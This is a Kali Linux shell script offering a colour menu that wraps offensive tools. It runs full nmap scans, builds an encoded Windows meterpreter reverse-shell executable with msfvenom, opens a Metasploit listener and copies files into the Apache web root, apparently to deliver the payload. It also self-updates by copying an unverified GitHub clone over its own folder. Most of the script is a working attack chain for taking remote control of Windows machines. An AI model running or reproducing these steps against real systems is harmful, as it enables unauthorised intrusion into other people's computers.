#!/bin/sh

print_menu() {
    echo $Blue2"========================================================================="
    figlet "Easy Terminal" | lolcat
    echo " [---] Welcome To Easy Terminal This Tool By Author : [---]"
    figlet "BO7MED MIX YT" | lolcat
    echo $Blue2"========================================================================="
    echo 
    echo $red "==============================" $red "=============================="
    echo $red "[1]. Start Nmap Scan          " $red "[2]. Make Payload             "
    echo $red "==============================" $red "=============================="
    echo $cyan "==============================" $cyan "=============================="
    echo $cyan "[3]. Create Metasploit Listener" $cyan "[4]. Start Nessus             "
    echo $cyan "==============================" $cyan "=============================="
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $okegreen  "[5]. Start Apache2            " $okegreen "[6]. Stop Apache2             "
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $yellow "=============================="  $yellow "=============================="
    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Updates Files "
    echo $yellow "=============================="  $yellow "=============================="
    echo $white "==============================" $white "=============================="
    echo $white "[9]. Update Script            " $white "[10]. Exit                    "
    echo $white "==============================" $white "=============================="
}

cyan='\e[0;36m'
Blue2='\e[0;34m'
okegreen='\033[92m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
Blue='\e[1;34m'

show_ip_addresses() {
    echo "========================================================================="
    echo "IPv4 and IPv6 Addresses"
    echo "========================================================================="
    echo "IPv4 Addresses:"
    ip -4 addr show | grep inet | awk '{print $2}'
    echo ""
    echo "IPv6 Addresses:"
    ip -6 addr show | grep inet6 | awk '{print $2}'
    echo "========================================================================="
}

update_script() {
    script_dir="/home/kali/easy-terminal-script"
    temp_dir="/tmp/easy-terminal-update"
    repo_url="https://github.com/DevBO7MED/easy-terminal-script"

    echo "Updating repository in script directory $script_dir..."
    
    # Create a temporary directory to clone the repository
    mkdir -p $temp_dir
    cd $temp_dir

    # Clone the repository into the temporary directory
    git clone $repo_url .

    if [ $? -eq 0 ]; then
        echo "Cloned repository successfully. Updating files..."
        
        # Copy the updated files from the temp directory to the script directory
        cp -r $temp_dir/* $script_dir/
        
        echo "Update complete! Please restart the script using option 10."
    else
        echo "Failed to clone repository."
    fi

    # Cleanup
    cd /
    rm -rf $temp_dir

    echo "Press [ENTER] key to return to menu."
    read cont
    clear
}

execute_option() {
    case $1 in
        1)
            read -p "Enter The Target IP Or Link : " IP
            sudo nmap -sS -O -Pn -sV -p- $IP
            echo
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        2)  
            echo
            read -p "Enter LHOST (IP): " lhost
            read -p "Enter LPORT (Port): " lport
            read -p "Enter Payload Path (e.g., \"/home/kali\") : " L
            read -p "Enter Payload Name (e.g., \"Payload.exe\") : " N
            echo "Creating Payload..."
            payload_path="$L"
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path/$N
            clear
            print_menu
            echo "Payload created successfully!"
            echo "Path to payload: $payload_path/$N"
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        3)  
            sudo postgresql service start
            sudo msfdb init
            xterm -hold -e "
                echo '========================================================================='
                echo 'IPv4 and IPv6 Addresses'
                echo '========================================================================='
                echo 'IPv4 Addresses:'
                ip -4 addr show | grep inet | awk '{print \$2}'
                echo ''
                echo 'IPv6 Addresses:'
                ip -6 addr show | grep inet6 | awk '{print \$2}'
                echo '========================================================================='
                echo 'Enter LHOST (IP address for Metasploit):'
                read LHOST
                echo 'Enter LPORT (Port for Metasploit):'
                read LPORT
                echo 'Starting Metasploit With Listener...'
                msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
            " &
            ;;
        
        4)
            echo "Starting Nessus"
            sudo systemctl start nessusd
            clear
            echo "Nessus Started Successfully. You Can Now Open Nessus By Opening This Link { https://localhost:8834 }"
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        5)
            echo "Starting Apache2 Service..."
            sudo service apache2 start
            read -p "Enter Location: " Source
            read -p "Enter Name: " Name
            sudo cp $Source /var/www/html/$Name
            echo "Apache Service Started And Uploaded The Files Successfully"
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        6)
            echo "Stopping Apache2 Service..."
            sudo service apache2 stop
            echo "Stopped Successfully"
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        7)
            echo "Updating and upgrading system..."
            sudo apt update
            sudo apt upgrade
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        8)
            sudo apt autoremove
            echo "Removed Successfully"
            echo $okegreen"Press [ENTER] key to return to menu."
            read cont
            clear
            ;;
        
        9)
            update_script
            ;;
        
        10)
            echo "Exiting..."
            exit 0
            ;;
        
        *)
            echo "Invalid choice. Try Again."
            sleep 2
            ;;
    esac
}

while true; do
    clear
    print_menu
    echo
    echo $okegreen"┌─["$red"Easy Terminal$okegreen]──[$red~$okegreen]─["$yellow"Menu$okegreen]:"
    read -p "└─────► " choice
    execute_option $choice
done
